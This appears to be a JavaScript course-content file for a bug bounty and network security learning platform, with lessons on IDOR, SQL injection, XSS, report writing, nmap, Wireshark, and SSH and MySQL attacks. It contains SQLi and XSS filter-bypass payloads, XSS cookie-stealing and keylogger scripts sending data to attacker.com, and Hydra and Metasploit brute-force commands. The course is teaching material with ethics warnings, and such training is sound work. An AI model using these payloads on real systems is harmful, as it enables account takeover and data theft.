import {
    Trophy, Shield, Search, Globe, Lock, Terminal,
    FileText, Zap, BookOpen, Target, Server, Database
} from 'lucide-react';

export const courses = [
    {
        id: 'intro-to-bug-bounty',
        title: 'Bug Bounty Hunting 101',
        description: 'The complete beginner\'s guide to ethical hacking. Learn how to legally hack companies and get paid for it.',
        icon: Trophy,
        level: 'Beginner',
        duration: '5h 30m',
        xp: 1500,
        modules: [
            {
                id: 'm1',
                title: 'Introduction to Bug Bounties',
                duration: '30m',
                lessons: [
                    {
                        id: 'what-is-bug-bounty',
                        title: 'What is Bug Bounty?',
                        type: 'text',
                        duration: '10m',
                        xp: 50,
                        content: `
# What is a Bug Bounty?

A bug bounty program is a deal offered by many websites, organizations and software developers by which individuals can receive recognition and compensation for reporting bugs, especially those pertaining to security exploits and vulnerabilities.

## Why Companies Do This?

- **Continuous Security**: Traditional penetration testing is done annually. Bug bounties are 24/7.
- **Diverse Talent**: Thousands of hackers with different skills test the system.
- **Cost Effective**: They only pay for valid, found vulnerabilities.

## The Players

1.  **Program Owner**: The company getting hacked (e.g., Google, Uber).
2.  **Platform**: The intermediary (e.g., HackerOne, Bugcrowd).
3.  **Researcher (You)**: The hunter finding the bugs.
                        `
                    },
                    {
                        id: 'legal-and-ethics',
                        title: 'Ethics & Legal Boundaries',
                        type: 'text',
                        duration: '10m',
                        xp: 50,
                        content: `
# Staying Legal

Hacking is illegal without permission. Bug bounty programs give you that permission, but only within strict boundaries called **Scope**.

## The Golden Rules

1.  **Scope is God**: Only test domains listed in scope.
2.  **Do No Harm**: Never delete data or crash services.
3.  **Privacy First**: If you find user data, stop and report. Don't dump the database.

> [!IMPORTANT]
> Always read the program policy before sending a single request. Creating an account on a production system without permission can get you banned or sued.
                        `
                    },
                    {
                        id: 'platforms-intro',
                        title: 'Overview of Platforms',
                        type: 'text',
                        duration: '10m',
                        xp: 50,
                        content: `
# Major Platforms

Most programs are hosted on these major platforms:

- **HackerOne**: The largest platform. Good for beginners but competitive.
- **Bugcrowd**: Known for good triage and private invites.
- **Intigriti**: Leading European platform, very community focused.
- **Synack**: Requires vetting/interview to join (Private only).

## Private vs Public

- **Public**: Anyone can join. Huge competition. Harder to find bugs.
- **Private**: Invite only. Less competition. Easier to find bugs.
                        `
                    }
                ]
            },
            {
                id: 'm2',
                title: 'Setting Up Your Lab',
                duration: '45m',
                lessons: [
                    {
                        id: 'burpsuite-setup',
                        title: 'Setting up Burp Suite',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# Burp Suite: The Hacker's Swiss Army Knife

Burp Suite is an intercepting proxy. It sits between your browser and the target server, allowing you to pause, view, and modify requests before they are sent.

## Core Components

1.  **Proxy**: Intercepts requests.
2.  **Repeater**: Modify and resend requests manually (Most used tab!).
3.  **Intruder**: Automate attacks (Brute force, Fuzzing).
4.  **Decoder**: Encoding/Decoding data (Base64, URL, etc).

## Installation

1.  Download **Burp Suite Community Edition** (Free).
2.  Install the certificate in your browser to inspect HTTPS traffic.
3.  Use the built-in Chromium browser for zero-config hacking.
                        `
                    },
                    {
                        id: 'browser-tools',
                        title: 'Essential Browser Extensions',
                        type: 'text',
                        duration: '20m',
                        xp: 50,
                        content: `
# Must-Have Extensions

Equip your browser (Firefox/Chrome) with these tools:

- **Wappalyzer**: Identifies technology stack (CMS, Frameworks, Libraries).
- **FoxyProxy**: Quickly switch Burp Proxy on/off.
- **HackTools**: Cheatsheets for XSS, SQLi payloads.
- **Cookie Editor**: View and modify cookies easily.
- **DotGit**: Checks for exposed .git directories.
                        `
                    }
                ]
            },
            {
                id: 'm3',
                title: 'Reconnaissance',
                duration: '45m',
                lessons: [
                    {
                        id: 'subdomain-enum',
                        title: 'Subdomain Enumeration',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# Finding the Attack Surface

The more you find, the more you can hack. Subdomain enumeration is finding the subdomains of a target.

## Why?
Main sites (www.target.com) are hardened. Dev sites (dev.target.com), staging (staging.api.target.com), or internal portals are often vulnerable.

## Tools
- **Subfinder**: Fast passive enumeration.
- **Amass**: Deep enumeration (Passive + Active).
- **Chaos**: Project Discovery's massive dataset.
                        `
                    },
                    {
                        id: 'tech-profiling',
                        title: 'Technology Profiling',
                        type: 'text',
                        duration: '20m',
                        xp: 50,
                        content: `
# Know Your Enemy

Before attacking, understand what the target is built with.

1.  **Wappalyzer**: Shows server type, JS libs.
2.  **HTTP Headers**: look for 'Server', 'X-Powered-By'.
3.  **GitHub**: Search for the company's repos.

> [!TIP]
> If you know they use an old version of WordPress, you can look for specific CVEs (Common Vulnerabilities) for that version instead of guessing.
                        `
                    }
                ]
            },
            {
                id: 'm4',
                title: 'First Vulnerabilities',
                duration: '30m',
                lessons: [
                    {
                        id: 'owasp-intro',
                        title: 'Intro to OWASP Top 10',
                        type: 'text',
                        duration: '15m',
                        xp: 50,
                        content: `
# The Holy Bible of Web Security

OWASP Top 10 is a standard awareness document for developers and web application security. It lists the most critical security risks to web applications.

## OWASP Top 10 (2021)

1.  **Broken Access Control** - IDOR, privilege escalation
2.  **Cryptographic Failures** - Weak encryption, exposed sensitive data
3.  **Injection** - SQLi, Command Injection, XSS
4.  **Insecure Design** - Missing security controls
5.  **Security Misconfiguration** - Default configs, verbose errors
6.  **Vulnerable Components** - Outdated libraries
7.  **Authentication Failures** - Session management flaws
8.  **Software/Data Integrity Failures** - Untrusted updates
9.  **Logging/Monitoring Failures** - No audit trail
10. **Server-Side Request Forgery (SSRF)** - Internal network access

> [!TIP]
> Focus on #1, #3, and #5 - they account for 60%+ of all bug bounty payouts!
                        `
                    },
                    {
                        id: 'idor-basics',
                        title: 'Finding Your First IDOR',
                        type: 'text',
                        duration: '15m',
                        xp: 75,
                        content: `
# Insecure Direct Object Reference (IDOR)

IDOR happens when an application exposes a reference to an internal object (like a file or database key) without checking access control.

## Example
\`https://api.site.com/user/1001\`

If I change \`1001\` to \`1002\` and see someone else's data, that's an IDOR.

## How to find?
1.  Create two accounts (User A and User B)
2.  Find ID parameters (user_id, order_id, file_id)
3.  Swap User A's ID into User B's request
4.  If it works -> **BOUNTY!** $$

## Common Locations
- Profile endpoints: \`/api/profile?id=123\`
- Order history: \`/orders/456\`
- File downloads: \`/download?file_id=789\`
- API responses: Look for IDs in JSON responses

## Pro Tips
- Try both numeric IDs (123) and UUIDs (a1b2-c3d4)
- Check HTTP headers for hidden IDs
- Test both GET and POST parameters
- Look for base64-encoded IDs
                        `
                    },
                    {
                        id: 'idor-exploitation',
                        title: 'Exploiting IDOR Bugs',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Testing Access Control

Finding an ID parameter is just step one. Now you must prove the vulnerability.

## The Testing Methodology

1. **Create Accounts**: You need at least two accounts (Attacker and Victim) and ideally an Admin account.
2. **Map the Application**: Find every request that uses an ID.
3. **Swap IDs**: Replace the Attacker's ID with the Victim's ID.

## Types of IDOR

### GET-Based IDOR
The simplest form.
\`GET /api/messages?user_id=123\`
Change 123 to 124.

### POST-Based IDOR
Often hidden in JSON bodies.
\`\`\`json
{
  "user_id": 123,
  "email": "hacker@test.com"
}
\`\`\`

### Blind IDOR
The application doesn't return data, but performs an action (delete, update).
\`POST /api/delete_photo?id=500\`
If you delete someone else's photo, it's a valid P1 bug!

> [!WARNING]
> Only test with accounts you own. Deleting user data in production is illegal and dangerous.
                        `
                    }
                ]
            },
            {
                id: 'm5',
                title: 'SQL Injection Deep Dive',
                duration: '60m',
                lessons: [
                    {
                        id: 'sqli-intro',
                        title: 'Understanding SQL Injection',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# SQL Injection: The King of Web Vulnerabilities

SQL Injection occurs when user input is inserted into SQL queries without proper sanitization, allowing attackers to manipulate the database.

## How It Works

**Vulnerable Code:**
\`\`\`php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
\`\`\`

**Attack Payload:**
\`\`\`
username: admin' OR '1'='1
password: anything
\`\`\`

**Resulting Query:**
\`\`\`sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
\`\`\`

The condition \`'1'='1'\` is always true, bypassing authentication!

## Types of SQL Injection

1. **In-Band SQLi** - Results returned directly in response
2. **Blind SQLi** - No direct output, use true/false conditions
3. **Time-Based Blind** - Measure response time delays
4. **Out-of-Band** - Data exfiltrated via DNS/HTTP

## Common Injection Points

- Login forms
- Search boxes
- URL parameters (\`?id=1\`)
- Cookies
- HTTP headers (User-Agent, Referer)
                        `
                    },
                    {
                        id: 'sqli-exploitation',
                        title: 'Exploiting SQL Injection',
                        type: 'text',
                        duration: '25m',
                        xp: 125,
                        content: `
# SQL Injection Exploitation Techniques

## 1. Authentication Bypass

**Goal:** Login without credentials

**Payloads:**
\`\`\`sql
' OR '1'='1' --
' OR 1=1 --
admin'--
' UNION SELECT NULL, NULL--
\`\`\`

## 2. Data Extraction

**Goal:** Steal database contents

**Step 1: Find number of columns**
\`\`\`sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (Error = only 2 columns)
\`\`\`

**Step 2: Find injectable column**
\`\`\`sql
' UNION SELECT NULL, NULL--
' UNION SELECT 'test', NULL--
\`\`\`

**Step 3: Extract data**
\`\`\`sql
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, NULL FROM information_schema.tables--
\`\`\`

## 3. Blind SQL Injection

**Boolean-Based:**
\`\`\`sql
' AND (SELECT LENGTH(database())) > 5--  (true/false response)
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
\`\`\`

**Time-Based:**
\`\`\`sql
' AND IF(1=1, SLEEP(5), 0)--  (delays response)
' OR IF((SELECT LENGTH(database()))>5, SLEEP(5), 0)--
\`\`\`

## Defense Bypass Techniques

**WAF Evasion:**
- Case variation: \`SeLeCt\`
- Comments: \`/**/\` between keywords
- Encoding: URL encode, double encode
- Alternative syntax: \`UNION ALL SELECT\` vs \`UNION SELECT\`

> [!WARNING]
> Always test on authorized targets only. Unauthorized database access is a federal crime.
                        `
                    },
                    {
                        id: 'sqli-tools',
                        title: 'SQL Injection Tools',
                        type: 'text',
                        duration: '15m',
                        xp: 75,
                        content: `
# Tools for SQL Injection

## SQLMap - The Automated SQLi Tool

**Installation:**
\`\`\`bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py
\`\`\`

**Basic Usage:**
\`\`\`bash
# Test a URL
sqlmap -u "http://target.com/page?id=1"

# Test with POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Dump database
sqlmap -u "http://target.com/page?id=1" --dump

# Get database names
sqlmap -u "http://target.com/page?id=1" --dbs
\`\`\`

## Manual Testing Tools

1. **Burp Suite** - Intercept and modify requests
2. **Postman** - API testing
3. **Browser DevTools** - Quick parameter manipulation

## Detection Tools

- **Acunetix**
- **Nikto**
- **OWASP ZAP**

> [!TIP]
> Master manual SQLi before relying on automated tools. Bug bounty platforms often reject SQLMap-only reports.
                        `
                    },
                    {
                        id: 'sqli-prevention',
                        title: 'Preventing SQL Injection',
                        type: 'text',
                        duration: '15m',
                        xp: 100,
                        content: `
# Defending Against SQL Injection

Understanding how to fix vulnerabilities is just as important as finding them.

## 1. Parameterized Queries (Prepared Statements)
The #1 defense against SQLi. Instead of concatenating input, you define structure first.

**Vulnerable PHP:**
\`\`\`php
$sql = "SELECT * FROM users WHERE id = " . $id;
\`\`\`

**Secure PHP (PDO):**
\`\`\`php
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $id]);
\`\`\`

## 2. Input Validation (Allow-listing)
Only accept expected values.
- If ID should be a number, ensure it is an integer.
- If sort_by can only be 'name' or 'date', check against that list.

## 3. Least Privilege
The database user for the web app should not be 'root' or 'sa'.
- Only grant SELECT/INSERT/UPDATE/DELETE.
- Remove permissions for DROP TABLE or FILE access.

## 4. Modern ORMs
Using an ORM like Sequelize (Node), Entity Framework (C#), or Eloquent (Laravel) handles escaping automatically in most cases.
                        `
                    }
                ]
            },
            {
                id: 'm6',
                title: 'Cross-Site Scripting (XSS)',
                duration: '50m',
                lessons: [
                    {
                        id: 'xss-fundamentals',
                        title: 'XSS Fundamentals',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious JavaScript into web pages viewed by other users.

## Types of XSS

### 1. Reflected XSS
Script comes from current HTTP request

**Example:**
\`\`\`
http://site.com/search?q=<script>alert(1)</script>
\`\`\`

### 2. Stored XSS
Script is stored on the server (database, comment, profile)

**Example:**
User posts comment: \`<script>steal_cookies()</script>\`
Everyone who views the page executes the script!

### 3. DOM-Based XSS
Vulnerability in client-side JavaScript

**Vulnerable Code:**
\`\`\`javascript
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;
\`\`\`

**Attack:**
\`\`\`
http://site.com/#<img src=x onerror=alert(1)>
\`\`\`

## Common Injection Points

- Search boxes
- Comment sections
- User profiles (name, bio)
- URL parameters
- File names
- HTTP headers (Referer, User-Agent)
                        `
                    },
                    {
                        id: 'xss-payloads',
                        title: 'XSS Payloads & Exploitation',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# XSS Payloads & Exploitation

## Basic Payloads

\`\`\`html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
\`\`\`

## Advanced Payloads

**Steal Cookies:**
\`\`\`javascript
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
\`\`\`

**Keylogger:**
\`\`\`javascript
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
}
</script>
\`\`\`

**Session Hijacking:**
\`\`\`javascript
<script>
new Image().src = 'https://attacker.com/?c=' + document.cookie;
</script>
\`\`\`

## Filter Bypass Techniques

**Blacklist Bypass:**
\`\`\`html
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCript>alert(1)</sCRIPT>
<script>alert(String.fromCharCode(88,83,83))</script>
\`\`\`

**Event Handlers:**
\`\`\`html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
\`\`\`

**Encoding:**
\`\`\`html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
\`\`\`

## Impact Examples

- Steal authentication tokens
- Perform actions as the victim
- Deface websites
- Redirect users to phishing sites
- Crypto mining in victim's browser
                        `
                    },
                    {
                        id: 'xss-hunting',
                        title: 'Hunting for XSS',
                        type: 'text',
                        duration: '10m',
                        xp: 75,
                        content: `
# Hunting for XSS Vulnerabilities

## Step-by-Step Process

### 1. Find Input Points
- Every form field
- URL parameters
- HTTP headers
- File uploads (filename)

### 2. Test Basic Payloads
\`\`\`html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
\`\`\`

### 3. Check Response
- View page source
- Look for your payload
- Check if it's inside HTML, attribute, or script context

### 4. Context-Aware Payloads

**Inside HTML:**
\`\`\`html
<img src=x onerror=alert(1)>
\`\`\`

**Inside Attribute:**
\`\`\`html
" onload=alert(1) "
\`\`\`

**Inside JavaScript:**
\`\`\`javascript
';alert(1);//
\`\`\`

## Pro Tips

✅ Test EVERY input, even hidden fields
✅ Check reflected parameters in URL
✅ Test error messages
✅ Check JavaScript variable assignments
✅ Look for user-controlled DOM manipulation
✅ Test file upload filenames

> [!TIP]
> Many high-paying XSS bugs are found in obscure parameters like error callbacks or debug modes.
                        `
                    },
                    {
                        id: 'xss-prevention',
                        title: 'XSS Prevention Guide',
                        type: 'text',
                        duration: '15m',
                        xp: 100,
                        content: `
# Preventing Cross-Site Scripting (XSS)

Stop attackers from executing malicious scripts in your application.

## 1. Output Encoding (Context-Aware)
The golden rule: Treat all user input as untrusted. Convert special characters into safe HTML entities before displaying them.

- **In HTML Body:** Convert \`< > & " '\` to \`&lt; &gt; &amp; &quot; &#x27;\`
- **In Attributes:** Attribute encode values.
- **In JavaScript:** Unicode escape.

**Frameworks help you:**
React, Angular, and Vue do this automatically in their default data binding (e.g., \`{variable}\`). 
**Danger:** Avoid \`dangerouslySetInnerHTML\` (React) or \`v-html\` (Vue).

## 2. Content Security Policy (CSP)
A browser mechanism to whitelist trusted sources of executable scripts.

**Example Header:**
\`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;\`

This prevents the browser from executing inline scripts (\`<script>...\</script>\`) and scripts from unauthorized domains.

## 3. HttpOnly Cookies
Mark session cookies as \`HttpOnly\`. This prevents client-side JavaScript (like an XSS payload) from reading the cookie, mitigating cookie theft.
                        `
                    }
                ]
            },
            {
                id: 'm7',
                title: 'Report Writing',
                duration: '40m',
                lessons: [
                    {
                        id: 'writing-reports',
                        title: 'Writing Professional Reports',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# Writing Professional Bug Reports

A great report can be the difference between $0 and $10,000+.

## Report Structure

### 1. Title
**Bad:** "XSS in website"
**Good:** "Stored XSS in comment section leads to account takeover"

### 2. Severity
- **Critical** - Account takeover, RCE, data breach
- **High** - Stored XSS, SQLi, privilege escalation
- **Medium** - Reflected XSS, IDOR
- **Low** - Self-XSS, information disclosure

### 3. Summary
2-3 sentences explaining the vulnerability

**Example:**
"The comment section allows users to post unescaped HTML/JavaScript. An attacker can inject a malicious script that steals session cookies of all users viewing the comment, leading to account takeover."

### 4. Steps to Reproduce
\`\`\`
1. Navigate to https://target.com/blog/post/123
2. Post a comment with payload: <script>alert(document.cookie)</script>
3. Refresh the page
4. Observe the JavaScript execution
\`\`\`

### 5. Proof of Concept
- Screenshots
- Video recording (Loom/CloudApp)
- Code snippets
- HTTP requests/responses

### 6. Impact
Explain what an attacker can do:
- Steal session cookies
- Perform actions as victim
- Access sensitive data
- Escalate privileges

### 7. Remediation
How to fix it:
- Use Content-Security-Policy headers
- Escape user input with htmlspecialchars()
- Use parameterized queries for SQLi
- Implement proper access control
                        `
                    },
                    {
                        id: 'report-examples',
                        title: 'Real Report Examples',
                        type: 'text',
                        duration: '15m',
                        xp: 75,
                        content: `
# Real Bug Bounty Report Examples

## Example 1: Stored XSS ($5,000)

**Title:** Stored XSS in Team Name Field Leads to Admin Account Takeover

**Summary:**
The team name field in account settings does not sanitize HTML input. An attacker can create a team with a malicious name containing JavaScript that executes when an admin views the teams list. This can be used to steal the admin's session token and takeover their account.

**Steps to Reproduce:**
1. Login to https://target.com
2. Go to Settings > Create Team
3. Enter team name: \`<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>\`
4. Save the team
5. Have an admin view the teams page
6. The admin's cookies are sent to attacker.com

**Impact:**
- Full admin account takeover
- Access to all users' personal data
- Ability to modify/delete all data

**Recommendation:**
Implement HTML escaping for all user-generated content using a library like DOMPurify.

---

## Example 2: IDOR ($3,000)

**Title:** IDOR in Order API Allows Access to Any User's Orders

**Summary:**
The /api/orders endpoint uses sequential order IDs without authorization checks. Any authenticated user can view other users' order details, including shipping addresses, payment methods, and personal information.

**Steps to Reproduce:**
1. Login as User A (user@test.com)
2. Place an order, note the order ID (e.g., 12345)
3. Logout and login as User B (attacker@test.com)
4. Send GET request: \`/api/orders/12345\`
5. Observe User A's full order details in response

**Impact:**
- Privacy violation
- Access to PII (names, addresses, phone numbers)
- Business intelligence leakage

**Recommendation:**
Implement authorization checks to verify the requesting user owns the resource.
                        `
                    }
                ]
            },
            {
                id: 'm8',
                title: 'Authentication Basics',
                duration: '45m',
                lessons: [
                    {
                        id: 'auth-basics',
                        title: 'Secure Password Storage',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Authentication & Password Storage

Authentication is the lock on the front door. If it's weak, nothing else matters.

## Storing Passwords Securely

**NEVER** store passwords in plain text.
**NEVER** use reversible encryption (AES, DES).
**NEVER** use weak hashing (MD5, SHA1) without salt.

### The Right Way: Salting & Hashing
1. **Salt**: A random string added to the password before hashing. Prevents Rainbow Table attacks.
2. **Hash**: A one-way mathematical function.
3. **Slow Algorithm**: Use algorithms designed to be slow (bcrypt, PBKDF2, Argon2, scrypt) to resist Brute Force.

**Python Example:**
\`\`\`python
import bcrypt

salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password.encode(), salt)
\`\`\`

## Authentication Vulnerabilities to Hunt

1. **Weak Password Policy**: Allowing "123456".
2. **No Rate Limiting**: Allowing unlimited login attempts (Brute Force).
3. **Username Enumeration**: "User not found" vs "Wrong password".
4. **Session Management**: Tokens not expiring on logout.
                        `
                    }
                ]
            }
        ]
    },
    {
        id: 'network-security-101',
        title: 'Network Security',
        description: 'Master the art of network mapping, packet analysis, and exploiting common services.',
        icon: Server,
        level: 'Intermediate',
        duration: '6h 45m',
        xp: 2000,
        modules: [
            {
                id: 'net-m1',
                title: 'Network Fundamentals',
                duration: '45m',
                lessons: [
                    {
                        id: 'networking-basics',
                        title: 'TCP/IP & OSI Model',
                        type: 'text',
                        duration: '20m',
                        xp: 75,
                        content: `
# Understanding Networks

## The OSI Model (7 Layers)
1. **Physical** - Cables, electrical signals
2. **Data Link** - MAC addresses, switches
3. **Network** - IP addresses, routing
4. **Transport** - TCP/UDP, ports
5. **Session** - Connection management
6. **Presentation** - Encryption, compression
7. **Application** - HTTP, FTP, SSH

## TCP vs UDP

**TCP (Transmission Control Protocol):**
- Connection-oriented
- Reliable (guarantees delivery)
- Slower
- Used by: HTTP, SSH, FTP

**UDP (User Datagram Protocol):**
- Connectionless
- Unreliable (no guarantee)
- Faster
- Used by: DNS, VoIP, streaming

## Common Ports to Know

\`\`\`
21   - FTP
22   - SSH
23   - Telnet
25   - SMTP
53   - DNS
80   - HTTP
443  - HTTPS
3306 - MySQL
3389 - RDP
5432 - PostgreSQL
\`\`\`

## IP Addressing

**IPv4:** 192.168.1.1 (32-bit)
**IPv6:** 2001:0db8:85a3:0000:0000:8a2e:0370:7334 (128-bit)

**Private IP Ranges:**
- 10.0.0.0/8
- 172.16.0.0/12
- 192.168.0.0/16
                        `
                    },
                    {
                        id: 'nmap-basics',
                        title: 'Nmap Scanning Techniques',
                        type: 'text',
                        duration: '35m',
                        xp: 125,
                        content: `
# Nmap: The Network Mapper

Nmap is the industry-standard tool for network discovery and security auditing.

## Installation

\`\`\`bash
# Linux (Debian/Ubuntu)
sudo apt install nmap

# macOS
brew install nmap

# Windows
# Download from nmap.org
\`\`\`

## Basic Scans

**Ping Sweep (Host Discovery):**
\`\`\`bash
nmap -sn 192.168.1.0/24
\`\`\`

**Port Scan Single Host:**
\`\`\`bash
nmap 192.168.1.1
\`\`\`

**Scan Specific Ports:**
\`\`\`bash
nmap -p 80,443,8080 192.168.1.1
\`\`\`

**Scan All Ports:**
\`\`\`bash
nmap -p- 192.168.1.1
\`\`\`

## Scan Types

### 1. TCP Connect Scan (-sT)
\`\`\`bash
nmap -sT 192.168.1.1
\`\`\`
- Completes full TCP handshake
- Most reliable
- Easily detected in logs

### 2. SYN Scan (-sS) [Default]
\`\`\`bash
sudo nmap -sS 192.168.1.1
\`\`\`
- Half-open scan (doesn't complete handshake)
- Stealthier
- Requires root/admin

### 3. UDP Scan (-sU)
\`\`\`bash
sudo nmap -sU 192.168.1.1
\`\`\`
- Scans UDP ports
- Slower than TCP
- Important for DNS, SNMP

### 4. Version Detection (-sV)
\`\`\`bash
nmap -sV 192.168.1.1
\`\`\`
- Detects service versions
- Essential for vulnerability research

### 5. OS Detection (-O)
\`\`\`bash
sudo nmap -O 192.168.1.1
\`\`\`
- Identifies operating system

## Advanced Techniques

**Aggressive Scan (-A):**
\`\`\`bash
sudo nmap -A 192.168.1.1
\`\`\`
Enables: OS detection, version detection, script scanning, traceroute

**Fast Scan (-F):**
\`\`\`bash
nmap -F 192.168.1.1
\`\`\`
Scans top 100 ports (vs 1000 default)

**Timing Templates (-T0 to -T5):**
\`\`\`bash
nmap -T4 192.168.1.1
\`\`\`
- T0: Paranoid (slowest, stealthiest)
- T3: Normal (default)
- T5: Insane (fastest, noisiest)

## Nmap Scripting Engine (NSE)

**List Available Scripts:**
\`\`\`bash
ls /usr/share/nmap/scripts/
\`\`\`

**Run Specific Script:**
\`\`\`bash
nmap --script=http-enum 192.168.1.1
\`\`\`

**Run All Vuln Scripts:**
\`\`\`bash
nmap --script vuln 192.168.1.1
\`\`\`

**Useful Scripts:**
- \`http-enum\` - Enumerate directories
- \`smb-vuln-*\` - Check SMB vulnerabilities
- \`ssh-brute\` - SSH brute force
- \`mysql-empty-password\` - Check for empty passwords

## Output Formats

**Save All Formats:**
\`\`\`bash
nmap -oA scan_results 192.168.1.1
\`\`\`
Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap

> [!TIP]
> Always save your scans! Use \`-oA\` to save in all formats for future reference.
                        `
                    },
                    {
                        id: 'wireshark-intro',
                        title: 'Packet Analysis with Wireshark',
                        type: 'text',
                        duration: '40m',
                        xp: 150,
                        content: `
# Wireshark: Packet Analysis

Wireshark is a network protocol analyzer that lets you capture and inspect network traffic in real-time.

## Installation

**Linux:**
\`\`\`bash
sudo apt install wireshark
\`\`\`

**macOS:**
\`\`\`bash
brew install --cask wireshark
\`\`\`

**Windows:** Download from wireshark.org

## Capturing Traffic

1. Open Wireshark
2. Select network interface (WiFi/Ethernet)
3. Click "Start Capturing"
4. Generate traffic (browse websites, run commands)
5. Click "Stop" to analyze

## Display Filters

**Filter by Protocol:**
\`\`\`
http
https
dns
ftp
ssh
\`\`\`

**Filter by IP:**
\`\`\`
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1
\`\`\`

**Filter by Port:**
\`\`\`
tcp.port == 80
tcp.dstport == 443
\`\`\`

**HTTP Requests:**
\`\`\`
http.request.method == "GET"
http.request.method == "POST"
\`\`\`

**Combinations:**
\`\`\`
ip.src == 192.168.1.1 and tcp.port == 80
http and ip.addr == 192.168.1.1
\`\`\`

## Following TCP Streams

1. Right-click on a packet
2. Select "Follow > TCP Stream"
3. See full conversation between client/server

**Great for:**
- Viewing HTTP requests/responses
- Analyzing FTP logins
- Debugging network issues

## Finding Passwords

**Unencrypted Protocols (FTP, Telnet, HTTP Basic Auth):**

1. Filter: \`ftp\` or \`http.authbasic\` or \`telnet\`
2. Look for credentials in plaintext
3. Follow TCP stream to see full session

**Example FTP Filter:**
\`\`\`
ftp.request.command == "USER" or ftp.request.command == "PASS"
\`\`\`

## Analyzing HTTP Traffic

**Find All HTTP Requests:**
\`\`\`
http.request
\`\`\`

**Find Specific URLs:**
\`\`\`
http.request.uri contains "login"
http.request.uri contains "admin"
\`\`\`

**Find Responses:**
\`\`\`
http.response.code == 200
http.response.code == 404
\`\`\`

## Exporting Data

**Export Objects (Files):**
1. File > Export Objects > HTTP
2. See all files transferred via HTTP
3. Save suspicious files for analysis

## Pro Tips

✅ Use capture filters to reduce noise: \`tcp port 80 or 443\`
✅ Color rules help identify traffic types quickly
✅ Use "Statistics > Protocol Hierarchy" to see traffic breakdown
✅ Right-click packets for quick analysis options
✅ Use "tshark" for command-line analysis

> [!WARNING]
> Capturing network traffic without authorization is illegal. Only analyze traffic on networks you own or have permission to test.
                        `
                    }
                ]
            },
            {
                id: 'net-m2',
                title: 'Service Exploitation',
                duration: '90m',
                lessons: [
                    {
                        id: 'ssh-attacks',
                        title: 'SSH & Remote Access',
                        type: 'text',
                        duration: '30m',
                        xp: 100,
                        content: `
# SSH Exploitation & Security

## SSH Basics

SSH (Secure Shell) provides secure remote access on port 22.

**Connect to SSH:**
\`\`\`bash
ssh user@192.168.1.1
ssh -p 2222 user@192.168.1.1  # Custom port
\`\`\`

## SSH Brute Force

**Using Hydra:**
\`\`\`bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
\`\`\`

**Using Nmap:**
\`\`\`bash
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1
\`\`\`

**Using Metasploit:**
\`\`\`
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
\`\`\`

## SSH Key Authentication

**Generate Key Pair:**
\`\`\`bash
ssh-keygen -t rsa -b 4096
\`\`\`

**Copy Public Key:**
\`\`\`bash
ssh-copy-id user@192.168.1.1
\`\`\`

**Connect with Key:**
\`\`\`bash
ssh -i ~/.ssh/id_rsa user@192.168.1.1
\`\`\`

## SSH Tunneling

**Local Port Forward:**
\`\`\`bash
ssh -L 8080:localhost:80 user@192.168.1.1
# Access internal service on localhost:8080
\`\`\`

**Dynamic Port Forward (SOCKS Proxy):**
\`\`\`bash
ssh -D 9050 user@192.168.1.1
# Configure browser to use SOCKS5 proxy localhost:9050
\`\`\`

**Remote Port Forward:**
\`\`\`bash
ssh -R 8080:localhost:80 user@192.168.1.1
\`\`\`

## Weak SSH Configurations

**Check for:**
- Root login enabled (\`PermitRootLogin yes\`)
- Password authentication (\`PasswordAuthentication yes\`)
- Weak encryption algorithms
- Old SSH versions (< 7.0)

**Test SSH Config:**
\`\`\`bash
ssh -v user@192.168.1.1
\`\`\`
                        `
                    },
                    {
                        id: 'database-attacks',
                        title: 'Database Service Exploitation',
                        type: 'text',
                        duration: '35m',
                        xp: 125,
                        content: `
# Database Exploitation

## MySQL (Port 3306)

**Connect:**
\`\`\`bash
mysql -h 192.168.1.1 -u root -p
\`\`\`

**Brute Force:**
\`\`\`bash
hydra -l root -P passwords.txt mysql://192.168.1.1
\`\`\`

**Common Default Credentials:**
- root : (empty)
- root : root
- root : password
- admin : admin

**Enumeration:**
\`\`\`sql
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM users;
\`\`\`

